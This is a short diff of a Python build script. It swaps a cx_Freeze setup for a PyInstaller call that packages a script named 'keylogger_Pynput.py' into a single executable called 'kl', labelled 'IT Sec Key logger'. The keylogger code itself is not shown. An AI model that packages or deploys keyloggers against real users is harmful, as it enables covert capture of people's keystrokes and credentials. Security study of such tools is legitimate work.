@@ -2,15 +2,13 @@
 #%pip install cx_Freeze
 # issues with the building 
 
+import PyInstaller.__main__ as pyi
 
-
-import cx_freeze
-
-setup(
-    name="kl",
-    version="1.0",
-    description="Simple Keylogger",
-    executables=[Executable('keylogger_game.py')],
-
-)
-
+pyi.run([
+    'keylogger_Pynput.py',
+    '--name=kl',
+    '--onefile',
+    '--console',
+    '--version=1.0',
+    '--description=IT Sec Key logger'
+])
